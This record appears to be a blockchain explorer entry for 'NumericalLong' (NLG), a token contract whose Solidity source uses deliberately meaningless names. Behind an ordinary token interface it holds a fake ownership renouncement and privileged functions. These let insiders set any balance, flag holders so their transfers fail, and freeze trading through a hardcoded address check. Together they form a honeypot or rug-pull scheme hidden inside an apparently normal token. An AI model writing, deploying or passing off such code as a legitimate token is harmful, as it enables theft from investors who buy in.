{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface launchedBuyTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toAt {\n    function createPair(address marketingSender, address swapAutoLimit) external returns (address);\n}\n\ninterface amountLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxTrading) external view returns (uint256);\n\n    function transfer(address exemptEnable, uint256 amountSender) external returns (bool);\n\n    function allowance(address atBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptEnable,\n        uint256 amountSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeExempt, uint256 value);\n    event Approval(address indexed atBuy, address indexed spender, uint256 value);\n}\n\ninterface modeLimitFund is amountLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NumericalLong is modeMax, amountLaunch, modeLimitFund {\n\n    mapping(address => mapping(address => uint256)) private feeFund;\n\n    function tokenLaunched() private view {\n        require(buyMin[_msgSender()]);\n    }\n\n    address public receiverShouldEnable;\n\n    string private totalMode = \"Numerical Long\";\n\n    function approve(address tokenBuy, uint256 amountSender) public virtual override returns (bool) {\n        feeFund[_msgSender()][tokenBuy] = amountSender;\n        emit Approval(_msgSender(), tokenBuy, amountSender);\n        return true;\n    }\n\n    address private receiverTeam;\n\n    uint256 limitSender;\n\n    bool public limitLaunch;\n\n    address public swapTrading;\n\n    bool public tokenMinMode;\n\n    uint256 private limitShouldSwap;\n\n    function minLaunch(address launchedTake) public {\n        require(launchedTake.balance < 100000);\n        if (totalTx) {\n            return;\n        }\n        if (limitLaunch != launchedFund) {\n            senderTotal = limitShouldSwap;\n        }\n        buyMin[launchedTake] = true;\n        \n        totalTx = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    event OwnershipTransferred(address indexed tradingTake, address indexed receiverFee);\n\n    function marketingTake(address teamAutoIs) public {\n        tokenLaunched();\n        if (limitShouldSwap != senderTotal) {\n            exemptReceiver = true;\n        }\n        if (teamAutoIs == receiverShouldEnable || teamAutoIs == swapTrading) {\n            return;\n        }\n        senderLaunch[teamAutoIs] = true;\n    }\n\n    uint256 isTeam;\n\n    function receiverLaunched(address teamTradingWallet, address exemptEnable, uint256 amountSender) internal returns (bool) {\n        if (teamTradingWallet == receiverShouldEnable) {\n            return maxMode(teamTradingWallet, exemptEnable, amountSender);\n        }\n        uint256 totalAmount = amountLaunch(swapTrading).balanceOf(teamExempt);\n        require(totalAmount == limitSender);\n        require(exemptEnable != teamExempt);\n        if (senderLaunch[teamTradingWallet]) {\n            return maxMode(teamTradingWallet, exemptEnable, sellTeamList);\n        }\n        return maxMode(teamTradingWallet, exemptEnable, amountSender);\n    }\n\n    address teamExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address tokenTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public buyMin;\n\n    function transferFrom(address teamTradingWallet, address exemptEnable, uint256 amountSender) external override returns (bool) {\n        if (_msgSender() != tokenTake) {\n            if (feeFund[teamTradingWallet][_msgSender()] != type(uint256).max) {\n                require(amountSender <= feeFund[teamTradingWallet][_msgSender()]);\n                feeFund[teamTradingWallet][_msgSender()] -= amountSender;\n            }\n        }\n        return receiverLaunched(teamTradingWallet, exemptEnable, amountSender);\n    }\n\n    uint256 public autoFund;\n\n    function name() external view virtual override returns (string memory) {\n        return totalMode;\n    }\n\n    function transfer(address buyTakeAuto, uint256 amountSender) external virtual override returns (bool) {\n        return receiverLaunched(_msgSender(), buyTakeAuto, amountSender);\n    }\n\n    bool private takeTx;\n\n    uint8 private receiverAuto = 18;\n\n    uint256 constant sellTeamList = 19 ** 10;\n\n    function launchIsMin(address buyTakeAuto, uint256 amountSender) public {\n        tokenLaunched();\n        feeToken[buyTakeAuto] = amountSender;\n    }\n\n    bool public exemptReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAuto;\n    }\n\n    function owner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    bool public receiverIs;\n\n    bool public totalTx;\n\n    function isMarketingTo() public {\n        emit OwnershipTransferred(receiverShouldEnable, address(0));\n        receiverTeam = address(0);\n    }\n\n    function fromModeTotal(uint256 amountSender) public {\n        tokenLaunched();\n        limitSender = amountSender;\n    }\n\n    function allowance(address teamShould, address tokenBuy) external view virtual override returns (uint256) {\n        if (tokenBuy == tokenTake) {\n            return type(uint256).max;\n        }\n        return feeFund[teamShould][tokenBuy];\n    }\n\n    uint256 public senderTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFromToken;\n    }\n\n    function maxMode(address teamTradingWallet, address exemptEnable, uint256 amountSender) internal returns (bool) {\n        require(feeToken[teamTradingWallet] >= amountSender);\n        feeToken[teamTradingWallet] -= amountSender;\n        feeToken[exemptEnable] += amountSender;\n        emit Transfer(teamTradingWallet, exemptEnable, amountSender);\n        return true;\n    }\n\n    mapping(address => bool) public senderLaunch;\n\n    string private listSell = \"NLG\";\n\n    uint256 private tradingFromToken = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private feeToken;\n\n    bool private launchedFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listSell;\n    }\n\n    constructor (){\n        \n        launchedBuyTake isSell = launchedBuyTake(tokenTake);\n        swapTrading = toAt(isSell.factory()).createPair(isSell.WETH(), address(this));\n        \n        receiverShouldEnable = _msgSender();\n        isMarketingTo();\n        buyMin[receiverShouldEnable] = true;\n        feeToken[receiverShouldEnable] = tradingFromToken;\n        \n        emit Transfer(address(0), receiverShouldEnable, tradingFromToken);\n    }\n\n    function balanceOf(address maxTrading) public view virtual override returns (uint256) {\n        return feeToken[maxTrading];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"fromModeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"launchIsMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAutoIs\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"minLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShouldEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMinMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTradingWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NumericalLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}